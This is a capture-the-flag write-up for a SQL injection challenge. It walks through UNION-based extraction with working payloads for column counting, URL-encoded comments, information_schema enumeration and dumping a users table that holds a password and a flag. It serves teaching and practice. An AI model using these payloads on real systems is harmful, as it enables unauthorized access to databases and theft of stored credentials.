## Challenge 2: Data Extraction with Union Injection (Beginner/Intermediate)

### Objective
Retrieve hidden data using UNION injection.

### Write-up
Notice that the frontend has a search bar that searches for all blogs posted by a specific user ID.

We know that there is a SQL injection vulnerability in the search bar.

Our target is to extract a flag from the database.

First, we need to determine how many columns the query is selecting and how many columns are actually being displayed.

By using the following payload, we can determine the number of columns being selected:
```
' ORDER BY 1 #--
' ORDER BY 2 #--
' ORDER BY 3 #--
' ORDER BY 4 #--
etc.
```

We found that this causes an error: "Error executing query." It might be a syntax error. We can craft our payload using `#--` to `%23%2D%2D`, which is the URL-encoded version of `#--`.

```
' ORDER BY 1 %23%2D%2D
' ORDER BY 2 %23%2D%2D
' ORDER BY 3 %23%2D%2D
' ORDER BY 4 %23%2D%2D
etc.
```

We found that the query causes an error when we use `ORDER BY 4 #--`, which means that the query is selecting 3 columns.

Now we need to find which columns are actually being displayed. We can do this by using the following payload:
```
' UNION SELECT 1,2,3 %23%2D%2D
```

We found that only columns 2 and 3 are being displayed, which means that we can only use 2 columns to extract the flag.

Next, we need to find what tables are in the database. We can do this by using the following payload:
```
' UNION SELECT NULL, table_schema, table_name FROM information_schema.tables %23%2D%2D
```

We found that there are 2 tables in the `db` database: `blogs` and `users`.

We try to investigate the `users` table by using the following payload:
```
' UNION SELECT NULL, table_schema, column_name FROM information_schema.columns WHERE table_name = 'users' %23%2D%2D
```

We found that the `users` table has 4 columns: `id`, `username`, `password`, and `flag`.

We can extract the flag by using the following payload:
```
' UNION SELECT NULL, flag, username FROM users %23%2D%2D
```

And we can find the flag from the output.